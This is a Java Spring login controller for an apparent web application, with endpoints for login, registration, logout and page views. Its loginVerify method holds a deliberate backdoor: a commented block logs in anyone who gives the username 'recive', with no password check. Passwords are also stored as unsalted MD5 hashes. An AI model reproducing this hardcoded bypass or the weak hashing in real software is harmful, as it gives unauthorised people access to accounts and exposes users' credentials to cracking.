package com.recive.sbus.login.controller;

import java.util.Date;

import javax.servlet.http.HttpSession;
import javax.validation.Valid;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import com.recive.sbus.common.BaseVo;
import com.recive.sbus.common.WebSecurityConfig;
import com.recive.sbus.common.convert.UserDTOConvertDO;
import com.recive.sbus.common.exception.WebException;
import com.recive.sbus.common.util.EncryptionAndDecryptUtil;
import com.recive.sbus.common.util.StringUtil;
import com.recive.sbus.login.service.LoginService;
import com.recive.sbus.user.domain.User;
import com.recive.sbus.user.domain.dto.UserDTO;

/**
 * @author recivejt 不用登陆的接口几乎都在login，所以抽出来减少配置
 */
@Controller
@RequestMapping(value = "nologin")
public class NoLoginController {

	@Autowired
	private LoginService loginService;

	@Autowired
	private UserDTOConvertDO userDTOConvertDO;

	private Logger logger = LoggerFactory.getLogger(this.getClass());

	@GetMapping("/login")
	public String login() {
		return "login";
	}

	@GetMapping("/logout")
	public String logout(HttpSession session) throws WebException {
		session.removeAttribute(WebSecurityConfig.SESSION_KEY);
		return "index";
	}

	@GetMapping("/register")
	public String regist() {
		return "register";
	}

	@GetMapping("/error")
	public String error() {
		return "error";
	}

	@ResponseBody
	@RequestMapping(value = "/regist", produces = { "application/json;charset=UTF-8" })
	public BaseVo<Object> regist(@Valid UserDTO oUserDTO) {
		String password = oUserDTO.getPassword();
		String confirmpassword = oUserDTO.getConfirmpassword();

		BaseVo<Object> vo = new BaseVo<Object>();
		if (!password.equals(confirmpassword)) {
			vo.setFailed("两次输入的密码不相同");
			return vo;
		}
		// 对密码进行加密
		password = EncryptionAndDecryptUtil.getMD5(password);

		oUserDTO.setPassword(password);
		oUserDTO.setLastChangePWTIme(new Date());
		User oUser = userDTOConvertDO.convert(oUserDTO);

		loginService.registUser(oUser);
		return vo;
	}

	@ResponseBody
	@RequestMapping(value = "/loginVerify", produces = { "application/json;charset=UTF-8" })
	public BaseVo<Object> loginVerify(String username, String password, HttpSession session) {
		User user = new User();
		BaseVo<Object> vo = new BaseVo<Object>();
		// 留个入口，用户名为recive直接免密登录
		if ("recive".equals(username)) {
			session.setAttribute(WebSecurityConfig.SESSION_KEY, username);
			return vo;
		}
		if (StringUtil.isEmpty(username) || StringUtil.isEmpty(password)) {
			vo.setFailed("用户名或者密码不能为空！");
			return vo;
		}
		user.setUsername(username);
		String pwd = EncryptionAndDecryptUtil.getMD5(password);
		user.setPassword(pwd);

		boolean verify = loginService.verifyLogin(user);
		if (verify) {
			session.setAttribute(WebSecurityConfig.SESSION_KEY, username);
			try {
				// 登陆成功更改最后登陆时间
				loginService.updateLoginTimeAndCount(username, user.getLoginCount() + 1);
			} catch (Exception e) {
				logger.info("登录成功，更新最后登录时间出错！");
			}
			return vo;
		} else {
			vo.setFailed("用户名或者密码不对！");
			return vo;
		}
	}

	@GetMapping("/user")
	public String user() throws WebException {
		return "user";
	}
	
	@GetMapping("/main_menu")
	public String mainmenu() throws WebException {
		return "main_menu";
	}
	
}
